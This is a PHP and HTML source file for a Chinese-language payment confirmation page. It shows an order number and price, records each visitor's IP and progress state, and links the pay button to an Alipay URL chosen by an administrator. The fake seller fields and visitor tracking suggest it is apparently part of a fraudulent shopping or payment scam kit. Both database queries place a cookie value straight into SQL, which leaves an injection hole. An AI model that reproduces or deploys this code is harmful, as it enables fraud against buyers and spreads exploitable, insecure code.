
<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');



$ip=getIP();

if($_COOKIE['GoodsID4']){
	$_GoodsID = _fetch_array("SELECT
									goods_class.gclass_id,
									goods_class.gc_name,
									goods_class.gc_type,
									goods_class.web_name,
									goods_class.jump_url,
									goods_class.web_logo,
									goods_class.web_name2,
									goods.goods_id,
									goods.title,
									goods.price,
									goods.freight,
									goods.region,
									goods.goods_desc,
									goods.test_desc,
									goods.hits,
									goods.stock,
									goods.doods_num,
									goods.tran_num,
									goods.recovery_rate,
									goods.user_portrait,
									goods.user_name,
									goods.user_gender,
									goods.user_grade,
									goods.att_capacity,
									goods.att_color,
									goods.att_channel,
									goods.weixin_img,
									goods.zhifubao_img,
									goods.goods_img1,
									goods.goods_img2,
									goods.goods_img3,
									goods.goods_img4,
									goods.goods_img5,
									goods.test_desc2,
									goods.is_shelves,
									goods.oldnew,
									goods.in_admin_id,
									goods.in_class_id,
									goods.imUrl,
									goods.zhifubaoURL,
									goods.add_time,
									goods.goods_oid
								FROM
									goods_class
								INNER JOIN goods ON goods_class.gclass_id = goods.in_class_id 
								WHERE goods_id='{$_COOKIE['GoodsID4']}'") or die('SQL执行错误');


}
if($_COOKIE['GoodsID4']){
	
    //存在就更新此数据状态为3地址页和时间
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE uip='{$ip}' AND gid='{$_COOKIE['GoodsID4']}'");
	
	if($_OID){
		_query("
			UPDATE 
				useraddress
			SET 
				state=4,
				utime='{$_CURRENT_TIME2}'
			WHERE 
				gid='{$_GoodsID['goods_id']}' LIMIT 1") or die(mysql_error());
		  _close();
		  session_destroy();
	}
	
	
	
	
}else{
    
}

?>

<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	    <meta http-equiv="X-UA-Compatible" content="ie=edge">
	    <link rel="stylesheet" href="style/css/style.css" />
		<script type="text/javascript" charset="utf-8" src="//midas.gtimg.cn/h5pay/js/util.js?v=62"></script>
	    <script src="style/js/jquery-2.1.0.js" ></script>
	    <script src="style/js/index.js" ></script>
	    <title>确认交易</title>
	</head>
	<body class="bgColor">
		<div class="orderNumber">
			<p><?php echo $_GoodsID['web_name'];?>订单号：</p>
			<p><?php echo $_COOKIE['orderid']; ?></p>
			<div>&yen;&nbsp;<?php echo $_GoodsID['price'];?></div>
		</div>
		<div class="gather clearfix">
			<span class="fl">收款方</span>
			<span class="fr"><?php echo $_GoodsID['web_name'];?></span>
		</div>
	<a class="rightNow" href="<?php echo $_GoodsID['zhifubaoURL'];?>"	<input type="button" class="rightNow" value="立即支付" id="buy"/><font color="#fff">立即支付</font></a>
		<script>
    (function(){
		var style = U.getParam('style'),title = U.getParam('title'),pf=U.getParam('pf'),id= U.getParam('id'),usr= U.getParam('usr'),env= U.getParam('env');

		if(title){document.title = decodeURIComponent(title);}
		
		U.req.report({
			3:usr||"",
			20 : pf||"",
			21 : 'h5.wechat.qrcode.pv',
			22 : navigator.userAgent,
			24 : id||"",
			26 : env||"",
			36 : encodeURIComponent(location.href)
		});
		var setMsg = function(html,showBtn){
			U.$('#title').innerHTML = html;
			if(showBtn){
				U.dom.show(U.$('#buy'));
			}else{
				U.dom.hide(U.$('#buy'));
			}
		};
		var closeWebView = function(time){
			setTimeout(function() {
				WeixinJSBridge.invoke("closeWindow");
			},time);
		};
		if(style=="ep"){
			setMsg("正在进入支付环境...",false);
		}
    	window.onerror = function(msg, file, line){
			var getStack = function() {
				var a3 = [], a2 = 0, a4 = arguments.callee.caller.caller;
				while(a2 < 10 && a4) {
					a2++;
					try {
				
		a3.push(a4.toString().replace(/function/g, "FN").substring(0, 100));
						a4 = a4.caller
					} catch(a1) {
						break
					}
				}
				return a3.join("<<<")
			};
			U.req.report({
				10 : msg,
				12 : file + " on line " + line,
				21 : 'h5pay.bug.wechatBuyError',
				22 : navigator.userAgent,
				35 : getStack().replace(/\s+/g, " "),
				36 : location.href
			});
		};

		var loading = {
			section : null,
			show : function(opt){
				opt = opt || {};
				if (!this.section) {
					this.section = document.createElement('section');
					document.body.insertBefore(this.section, document.body.firstChild);
				}else{
					U.dom.show(this.section);
				}

			},
			hide : function(){
				U.dom.hide(this.section);
			}
		};

    	var eventListened = false;
    	if (U.ua.weixin >=5) {
		    U.dom.on(U.$('#buy'), 'click', function(){
		    	buy();
		    });
		    var buy = function(){
			    var info = U.fn.getParams();

				var onWxJSBridgeReady = function(e) {
					loading.hide();
					setTimeout(function(){
						WeixinJSBridge.invoke('getBrandWCPayRequest',{
							appId : info.a || 'wx951bdcac522929b6', 
							timeStamp : info.t, 
							nonceStr : info.n, 
							"package" : decodeURIComponent(info.p), 
							"signType" : info.s, 
							"paySign" : info.si 
						},function(res){
							U.req.report({
								10 : res.err_msg,
								21 : 'h5cpay.wechat.getBrandWCPayRequest.error',
								22 : navigator.userAgent,
								36 : encodeURIComponent(location.href)
							});
							switch(res.err_msg){
								case 'get_brand_wcpay_request:ok' :

									setMsg('恭喜您，支付成功!',false);
									if(style=="ep"){
										closeWebView(0);
									}
									break;
								case 'get_brand_wcpay_request:cancel' :
									setMsg("您取消了支付，请点击下方按钮继续支付", true);
									break;
								case 'access_control:not_allow' :
									onWxJSBridgeReady();
									break;
								default :
									if(style=="ep") {
										setMsg("网络异常，请点击下方按钮继续支付", true);
									}
									break;
							}
						});
					}, 50);
			    };
				window.WeixinJSBridge ? onWxJSBridgeReady() : !eventListened && document.addEventListener('WeixinJSBridgeReady', onWxJSBridgeReady);
				eventListened = true;
		    };
			loading.show();
		    buy();
    	}else if (!U.ua.weixin) {
			setMsg('请使用微信打开本网站！',false);
    	}else{
			setMsg('您当前微信版本不支持微信支付，请<a href="http://weixin.qq.com/d">下载</a>最新版或使用电脑支付',false);
    	}

    })();
    </script>
	</body>
</html>